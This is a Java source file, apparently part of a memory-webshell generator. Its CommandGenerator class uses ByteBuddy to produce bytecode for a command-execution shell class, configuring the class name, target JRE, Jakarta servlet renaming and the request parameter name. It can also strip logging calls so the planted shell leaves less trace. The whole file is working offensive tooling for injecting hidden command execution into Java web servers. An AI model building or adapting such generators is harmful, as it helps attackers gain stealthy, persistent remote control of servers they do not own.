package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

import java.util.HashMap;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class CommandGenerator {

    public static byte[] generate(ShellConfig config, CommandConfig shellConfig) {
        if (shellConfig.getShellClass() == null) {
            throw new IllegalArgumentException("shellConfig.getClazz() == null");
        }

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(shellConfig.getShellClass())
                .name(shellConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(config.getTargetJreVersion()));

        if (config.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (config.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        if (config.getShellType().startsWith(ShellType.AGENT)) {
            builder = builder.visit(
                    new LdcReAssignVisitorWrapper(new HashMap<Object, Object>(3) {{
                        put("paramName", shellConfig.getParamName());
                    }})
            );
        } else {
            builder = builder.field(named("paramName")).value(shellConfig.getParamName());
        }

        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}